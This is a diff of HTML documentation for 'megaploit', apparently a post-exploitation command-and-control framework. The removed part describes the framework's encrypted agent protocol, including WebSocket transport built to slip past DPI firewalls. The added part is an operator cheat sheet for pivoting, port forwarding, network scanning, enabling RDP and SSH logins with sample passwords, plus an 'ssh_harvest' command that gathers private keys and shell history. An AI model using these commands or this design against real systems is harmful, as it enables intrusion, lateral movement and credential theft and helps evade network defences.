-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">response</span><span class="p">)</span>
-</span></code></pre></div></p>
-<p><strong>Key facts:</strong>
-- <code>hmac.compare_digest</code> is used (not <code>==</code>) to prevent timing side-channels.
-- The auth window is limited to <code>AUTH_TIMEOUT</code> (10 s) via a socket deadline; connections that hold open without responding are closed.
-- The key is a 32-byte secret loaded from <code>secret.key</code> (64 hex chars). On Unix, <code>crypto.py</code> warns if file permissions are broader than <code>0600</code>.
-- A key fingerprint (first 16 hex chars of <code>SHA-256(key)</code>) is printed on startup so operators can verify both sides share the same key without revealing it.</p>
-<hr />
-<h2 id="5-layer-3-protocol-version-handshake">5. Layer 3 — Protocol version handshake<a class="headerlink" href="#5-layer-3-protocol-version-handshake" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:172</code></a> — <code>handshake_server()</code> / <code>handshake_agent()</code></p>
-<p>Immediately after a successful HMAC auth, both sides exchange a single byte to negotiate between protocol v1 (legacy, plaintext) and v2 (AES-GCM encrypted).</p>
-<p><strong>Wire sequence:</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>Server                              Agent
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>  │                                   │
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>  │────── 0x4D (&#39;M&#39;) ────────────────►│   (v2 capability byte)
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>  │◄───── echo (1 byte) ──────────────│
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>  │                                   │
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6" href="#__codelineno-10-6"></a>  │  if echo == 0x4D AND key present: │
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7" href="#__codelineno-10-7"></a>  │    → activate AES-GCM state       │
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8" href="#__codelineno-10-8"></a>  │  else:                            │
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9" href="#__codelineno-10-9"></a>  │    → plaintext v1 fallback        │
-</span></code></pre></div>
-<p><strong>Magic bytes:</strong>
-- <code>0x4D</code> = ASCII <code>'M'</code> → v2 encrypted
-- <code>0x00</code> → v1 plaintext fallback</p>
-<p>The server writes the magic byte first. The agent reads it and echoes it back verbatim. If both sides see <code>0x4D</code> and both have a key, <code>_ConnState(encrypted=True)</code> is installed on the socket. Any mismatch (e.g., a legacy agent that doesn't understand v2) causes both sides to fall back to plaintext.</p>
-<hr />
-<h2 id="6-layer-4-message-framing">6. Layer 4 — Message framing<a class="headerlink" href="#6-layer-4-message-framing" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:358</code></a> — <code>_recv_framed()</code>, <code>_recv_exactly()</code></p>
-<p>Every message — whether a text command, a file, or a file chunk — is wrapped in the same simple length-prefix frame:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>┌────────────────────────────────────────────────────┐
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>│  4 bytes  │  uint32 big-endian  │  payload length  │
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>├────────────────────────────────────────────────────┤
-</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>│  N bytes  │  payload            │  (see layers 5–7)│
-</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a>└────────────────────────────────────────────────────┘
-</span></code></pre></div>
-<p><strong>Python struct format:</strong> <code>"!I"</code> (<code>!</code> = network/big-endian, <code>I</code> = unsigned 32-bit int)</p>
-<p><code>_recv_exactly()</code> is a strict blocking read that loops until it has consumed exactly N bytes, preventing short-read fragmentation from TCP:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">_recv_exactly</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">n</span><span class="p">):</span>
-</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>    <span class="n">buf</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;&quot;</span>
-</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>    <span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span> <span class="o">&lt;</span> <span class="n">n</span><span class="p">:</span>
-</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>        <span class="n">chunk</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="n">n</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buf</span><span class="p">))</span>
-</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>        <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
-</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>            <span class="k">return</span> <span class="kc">None</span>   <span class="c1"># EOF → connection closed</span>
-</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>        <span class="n">buf</span> <span class="o">+=</span> <span class="n">chunk</span>
-</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>    <span class="k">return</span> <span class="n">buf</span>
-</span></code></pre></div>
-<p>A zero-length frame (<code>length == 0</code>) is legal and returns an empty byte string without reading further.</p>
-<hr />
-<h2 id="7-layer-5-aes-256-gcm-encryption">7. Layer 5 — AES-256-GCM encryption<a class="headerlink" href="#7-layer-5-aes-256-gcm-encryption" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:129</code></a> — <code>_encrypt()</code>, <code>_decrypt()</code></p>
-<p>When v2 is negotiated (layer 3), the <strong>payload</strong> inside every frame is replaced with:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>┌──────────────────────────────────────────────────────────────────────┐
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>│  12 bytes  │  GCM nonce (random, os.urandom)                         │
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>├──────────────────────────────────────────────────────────────────────┤
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>│  N bytes   │  AES-256-GCM ciphertext                                 │
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>├──────────────────────────────────────────────────────────────────────┤
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>│  16 bytes  │  GCM authentication tag                                 │
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>└──────────────────────────────────────────────────────────────────────┘
-</span></code></pre></div>
-<p>The nonce is generated fresh for every message with <code>os.urandom(12)</code> — never reused.</p>
-<p><strong>Encrypt path:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="n">nonce</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">urandom</span><span class="p">(</span><span class="mi">12</span><span class="p">)</span>
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="n">ct</span>    <span class="o">=</span> <span class="n">AESGCM</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>  <span class="c1"># ct includes the 16-byte tag</span>
-</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="k">return</span> <span class="n">nonce</span> <span class="o">+</span> <span class="n">ct</span>                                     <span class="c1"># 12 + len(plaintext) + 16 bytes</span>
-</span></code></pre></div></p>
-<p><strong>Decrypt path:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="n">nonce</span>  <span class="o">=</span> <span class="n">data</span><span class="p">[:</span><span class="mi">12</span><span class="p">]</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="n">ct_tag</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">12</span><span class="p">:]</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="k">return</span> <span class="n">AESGCM</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">nonce</span><span class="p">,</span> <span class="n">ct_tag</span><span class="p">,</span> <span class="kc">None</span><span class="p">)</span>      <span class="c1"># raises if tag fails</span>
-</span></code></pre></div></p>
-<p><strong>Fallback</strong> (when the <code>cryptography</code> package is not installed): the cipher degrades to a deterministic XOR-CTR stream derived from <code>SHA-256(key ‖ nonce ‖ block_counter)</code> plus a fake 16-byte zero tag. <strong>This fallback does not provide authentication.</strong> Install <code>cryptography</code> (<code>pip install cryptography</code>) for real AEAD security.</p>
-<hr />
-<h2 id="8-layer-6-sequence-numbers-replay-protection">8. Layer 6 — Sequence numbers &amp; replay protection<a class="headerlink" href="#8-layer-6-sequence-numbers-replay-protection" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:64</code></a> — <code>_ConnState</code></p>
-<p>The <strong>plaintext</strong> of every message (inside the AES-GCM envelope, or raw in v1) always starts with an 8-byte monotonic sequence number:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>┌──────────────────────────────────────────────────────────────┐
-</span><span id="__span-16-2"><a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a>│  8 bytes  │  uint64 big-endian  │  sequence number (1, 2, …) │
-</span><span id="__span-16-3"><a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a>├──────────────────────────────────────────────────────────────┤
-</span><span id="__span-16-4"><a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a>│  N bytes  │  actual payload (JSON string or raw file bytes)  │
-</span><span id="__span-16-5"><a id="__codelineno-16-5" name="__codelineno-16-5" href="#__codelineno-16-5"></a>└──────────────────────────────────────────────────────────────┘
-</span></code></pre></div>
-<p><strong>Python struct format:</strong> <code>"!Q"</code> (big-endian unsigned 64-bit int)</p>
-<p>Each side maintains two independent counters per connection:</p>
+<h2 id="pivoting-cheat-sheet">Pivoting Cheat Sheet<a class="headerlink" href="#pivoting-cheat-sheet" title="Permanent link">&para;</a></h2>
 <table>
 <thead>
 <tr>
-<th>Counter</th>
-<th>Direction</th>
-<th>Starts at</th>
-<th>Incremented</th>
+<th>Goal</th>
+<th>Command</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>_send_seq</code></td>
-<td>outgoing</td>
-<td>0</td>
-<td>before every send (first message = 1)</td>
+<td>Reach RDP on 10.10.0.20</td>
+<td><code>portfwd 8888 10.10.0.20 3389</code></td>
 </tr>
 <tr>
-<td><code>_recv_seq</code></td>
-<td>incoming</td>
-<td>-1</td>
-<td>updated on every accepted message</td>
+<td>Reach SSH on 10.10.0.20</td>
+<td><code>portfwd 2222 10.10.0.20 22</code></td>
+</tr>
+<tr>
+<td>Route all traffic through pivot</td>
+<td><code>socks5</code> then use proxychains</td>
+</tr>
+<tr>
+<td>Find live hosts in 10.10.0.0/24</td>
+<td><code>arp_scan 10.10.0.0/24</code></td>
+</tr>
+<tr>
+<td>Find services on 10.10.0.20</td>
+<td><code>port_scan 10.10.0.20 1-65535</code></td>
+</tr>
+<tr>
+<td>Discover domain computers</td>
+<td><code>net_view CORPORATE.LOCAL</code></td>
+</tr>
+<tr>
+<td>Enable RDP on target</td>
+<td><code>rdp_enable</code></td>
 </tr>
 </tbody>
 </table>
-<p><strong>Acceptance rule:</strong> a received sequence number is accepted only if it is strictly greater than <code>_recv_seq</code>. Equality or lower values raise <code>ValueError("Replay detected")</code>.</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">check_recv_seq</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">seq</span><span class="p">:</span> <span class="nb">int</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">bool</span><span class="p">:</span>
-</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>    <span class="k">if</span> <span class="n">seq</span> <span class="o">&gt;</span> <span class="bp">self</span><span class="o">.</span><span class="n">_recv_seq</span><span class="p">:</span>
-</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>        <span class="bp">self</span><span class="o">.</span><span class="n">_recv_seq</span> <span class="o">=</span> <span class="n">seq</span>
-</span><span id="__span-17-4"><a id="__codelineno-17-4" name="__codelineno-17-4" href="#__codelineno-17-4"></a>        <span class="k">return</span> <span class="kc">True</span>
-</span><span id="__span-17-5"><a id="__codelineno-17-5" name="__codelineno-17-5" href="#__codelineno-17-5"></a>    <span class="k">return</span> <span class="kc">False</span>   <span class="c1"># replay — drop</span>
-</span></code></pre></div>
-<p>Both <code>_send_seq</code> increments and <code>_recv_seq</code> checks are protected by a per-connection <code>threading.Lock</code> so concurrent threads sharing a socket do not race.</p>
 <hr />
-<h2 id="9-layer-7-json-message-encoding">9. Layer 7 — JSON message encoding<a class="headerlink" href="#9-layer-7-json-message-encoding" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:216</code></a> — <code>send_msg()</code>, <code>recv_msg()</code></p>
-<p>The payload bytes after the 8-byte sequence stamp are a UTF-8 encoded <strong>JSON string</strong> — not a JSON object or array, but a JSON-quoted string value:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>&quot;ls -la /tmp&quot;           ← operator sending a command
-</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>&quot;[+] total 8\ndrwxr-xr-x ...&quot;  ← agent sending a response
+<h2 id="ssh-operations">SSH Operations<a class="headerlink" href="#ssh-operations" title="Permanent link">&para;</a></h2>
+<h3 id="ssh-connect-to-internal-host">SSH connect to internal host<a class="headerlink" href="#ssh-connect-to-internal-host" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>megaploit session(1) » ssh_connect 10.10.0.20 22 root P@ssword!
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>megaploit session(1) » ssh_connect 10.10.0.50 22 ubuntu MyKey123
 </span></code></pre></div>
-<p><strong>Send path:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">seq</span>     <span class="o">=</span> <span class="n">state</span><span class="o">.</span><span class="n">next_send_seq</span><span class="p">()</span>                  <span class="c1"># increment, get next seq</span>
-</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;!Q&quot;</span><span class="p">,</span> <span class="n">seq</span><span class="p">)</span> <span class="o">+</span> <span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">)</span>
-</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="c1"># if encrypted: payload = _encrypt(key, payload)</span>
-</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="n">conn</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;!I&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span> <span class="o">+</span> <span class="n">payload</span><span class="p">)</span>
-</span></code></pre></div></p>
-<p><strong>Receive path:</strong>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">raw</span>     <span class="o">=</span> <span class="n">_recv_framed</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>                     <span class="c1"># read length + body</span>
-</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="c1"># if encrypted: raw = _decrypt(key, raw)</span>
-</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="n">seq</span>     <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s2">&quot;!Q&quot;</span><span class="p">,</span> <span class="n">raw</span><span class="p">[:</span><span class="mi">8</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
-</span><span id="__span-20-4"><a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">raw</span><span class="p">[</span><span class="mi">8</span><span class="p">:]</span>
-</span><span id="__span-20-5"><a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="n">check_recv_seq</span><span class="p">(</span><span class="n">seq</span><span class="p">)</span>                              <span class="c1"># replay guard</span>
-</span><span id="__span-20-6"><a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a><span class="k">return</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s2">&quot;utf-8&quot;</span><span class="p">))</span>       <span class="c1"># returns a Python str</span>
-</span></code></pre></div></p>
-<p><code>recv_msg</code> falls back to <code>payload.decode("utf-8", errors="replace")</code> without JSON parsing when the payload is not valid JSON — this lets legacy agents that send plain text still work.</p>
-<hr />
-<h2 id="10-file-transfer-protocol">10. File transfer protocol<a class="headerlink" href="#10-file-transfer-protocol" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:261</code></a> — <code>send_file()</code>, <code>recv_file()</code></p>
-<p>File data is transferred as a <strong>single frame</strong> using the same outer framing (layer 4) and encryption (layer 5), but the payload after the 8-byte sequence stamp is <strong>raw binary</strong> — no JSON encoding:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>Frame payload:
-</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>  [ 8 bytes seq ]  [ raw file bytes ]
-</span></code></pre></div>
-<p><strong>Transfer sequence</strong> (example: <code>download</code> command):</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>Server (operator)           Agent
-</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>       │                       │
-</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>       │── &quot;download foo.bin&quot;─►│    (send_msg — JSON string)
-</span><span id="__span-22-4"><a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a>       │                       │    agent reads file, prepares to send
-</span><span id="__span-22-5"><a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a>       │◄── &quot;FILE_OK&quot; ─────────│    (send_msg — JSON string signal)
-</span><span id="__span-22-6"><a id="__codelineno-22-6" name="__codelineno-22-6" href="#__codelineno-22-6"></a>       │◄── &lt;framed file&gt; ─────│    (send_file — raw bytes frame)
-</span><span id="__span-22-7"><a id="__codelineno-22-7" name="__codelineno-22-7" href="#__codelineno-22-7"></a>       │  recv_file() writes   │
-</span><span id="__span-22-8"><a id="__codelineno-22-8" name="__codelineno-22-8" href="#__codelineno-22-8"></a>       │  to loot/downloads/   │
-</span></code></pre></div>
-<p><code>recv_file()</code> accepts an optional <code>timeout</code> parameter; the socket deadline is set for the duration of the read and restored afterwards.</p>
-<hr />
-<h2 id="11-chunked-file-transfer">11. Chunked file transfer<a class="headerlink" href="#11-chunked-file-transfer" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:306</code></a> — <code>chunked_send_file()</code>, <code>chunked_recv_file()</code></p>
-<p>For files that are too large to buffer in RAM (default threshold: ~50 MB), the data is split into 1 MiB chunks. Each chunk is its own framed message with a 1-byte continuation flag prepended:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>Chunk payload:
-</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a>  [ 8 bytes seq ]  [ 1 byte flag: 0x01=more | 0x00=last ]  [ chunk data ]
-</span></code></pre></div>
-<p>The receiver loops, writing chunks to disk, until it sees <code>flag == 0x00</code>.</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="c1"># sender</span>
-</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="n">flag</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x01</span><span class="s2">&quot;</span> <span class="k">if</span> <span class="n">more_data_follows</span> <span class="k">else</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span>
-</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">payload</span> <span class="o">=</span> <span class="n">seq_bytes</span> <span class="o">+</span> <span class="n">flag</span> <span class="o">+</span> <span class="n">chunk</span>
-</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="n">send_frame</span><span class="p">(</span><span class="n">conn</span><span class="p">,</span> <span class="n">encrypt_if_needed</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
-</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>
-</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="c1"># receiver</span>
-</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
-</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>    <span class="n">raw</span>  <span class="o">=</span> <span class="n">recv_framed</span><span class="p">(</span><span class="n">conn</span><span class="p">)</span>
-</span><span id="__span-24-9"><a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a>    <span class="n">flag</span> <span class="o">=</span> <span class="n">raw</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">]</span>
-</span><span id="__span-24-10"><a id="__codelineno-24-10" name="__codelineno-24-10" href="#__codelineno-24-10"></a>    <span class="n">out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">9</span><span class="p">:])</span>
-</span><span id="__span-24-11"><a id="__codelineno-24-11" name="__codelineno-24-11" href="#__codelineno-24-11"></a>    <span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">:</span>
-</span><span id="__span-24-12"><a id="__codelineno-24-12" name="__codelineno-24-12" href="#__codelineno-24-12"></a>        <span class="k">break</span>
+<h3 id="ssh-credential-harvesting">SSH credential harvesting<a class="headerlink" href="#ssh-credential-harvesting" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>megaploit session(1) » ssh_harvest
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a># Collects:
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a># ~/.ssh/id_rsa, id_ecdsa, id_ed25519 (private keys)
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a># ~/.ssh/known_hosts (target fingerprints)
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a># bash/zsh history (SSH commands with credentials)
 </span></code></pre></div>
 <hr />
-<h2 id="12-websocket-transport-wstransport">12. WebSocket transport (WsTransport)<a class="headerlink" href="#12-websocket-transport-wstransport" title="Permanent link">&para;</a></h2>
-<p><strong>Source:</strong> <a href="../megaploit/core/protocol.py"><code>megaploit/core/protocol.py:387</code></a> — <code>class WsTransport</code></p>
-<p><code>WsTransport</code> is an optional shim that wraps <strong>all layers 4–7</strong> inside RFC 6455 WebSocket binary frames. It is used when agents need to communicate over port 80/443 and blend in with normal browser traffic to bypass DPI firewalls.</p>
-<h3 id="websocket-handshake">WebSocket handshake<a class="headerlink" href="#websocket-handshake" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>Agent                                   Server
-</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>  │── GET /ws HTTP/1.1                  ──►│
-</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>  │   Upgrade: websocket                   │
-</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>  │   Sec-WebSocket-Key: &lt;base64-nonce&gt;    │
-</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>  │                                        │
-</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>  │◄── HTTP/1.1 101 Switching Protocols ───│
-</span><span id="__span-25-7"><a id="__codelineno-25-7" name="__codelineno-25-7" href="#__codelineno-25-7"></a>  │    Sec-WebSocket-Accept: &lt;sha1-accept&gt; │
-</span></code></pre></div>
-<p>The <code>Sec-WebSocket-Accept</code> header is <code>base64(SHA-1(key + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"))</code> per RFC 6455 §4.2.2.</p>
-<h3 id="frame-format-rfc-6455">Frame format (RFC 6455)<a class="headerlink" href="#frame-format-rfc-6455" title="Permanent link">&para;</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>Byte 0:  FIN(1) RSV(3) Opcode(4)   — always 0x82 (FIN=1, binary opcode=2)
-</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a>Byte 1:  MASK(1) Payload length(7) — client frames are masked; server frames are not
